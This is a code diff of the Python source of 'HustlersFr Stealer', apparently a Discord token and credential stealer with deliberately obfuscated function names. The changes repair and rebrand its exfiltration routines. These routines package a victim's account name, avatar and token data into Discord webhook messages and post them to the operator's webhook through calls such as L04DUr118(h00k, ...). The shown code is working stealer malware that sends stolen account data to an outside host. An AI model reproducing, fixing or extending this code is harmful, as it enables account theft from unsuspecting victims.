@@ -480,15 +480,16 @@ def UP104D70K3N(token, path):
                 "name": f"{username}#{hashtag} ({idd})",
                 "icon_url": f"{pfp}"
                 },
-            "footer": {
+             "footer": {
                 "text": f"HustlersFr Stealer",
-                "icon_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg
+                "icon_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg"
+                },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "username": f"HustlersFr Stealer"
+        "username": f"HustlersFr Stealer | https://discord.gg/MFawdYQuMH",
         "avatar_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg",
         "attachments": []
         }
@@ -520,11 +521,12 @@ def UP104D(name, link):
                     "icon_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg"
                 },
                 }
-               ],
-     	   "username": f"HustlersFr Stealer"
-     	   "avatar_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg"
-     	   "attachments": []
-        }        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        ],
+        "username": f"HustlersFr Stealer | https://discord.gg/MFawdYQuMH",
+        "avatar_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg",
+        "attachments": []
+		}      
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
     
     if name == "kiwi":
@@ -551,11 +553,12 @@ def UP104D(name, link):
                     "icon_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg"
                 }
                 }
-        	   ],
-     	   "username": f"HustlersFr Stealer"
-     	   "avatar_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg"
-     	   "attachments": []
-        }       L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        	  ],
+        "username": f"HustlersFr Stealer | https://discord.gg/MFawdYQuMH",
+        "avatar_url": "https://github.com/YoutubeMossy/HustlersFr-Stealer/blob/main/xd.jpg",
+        "attachments": []
+		}      
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
 
 def Wr173F0rF113(data, name):
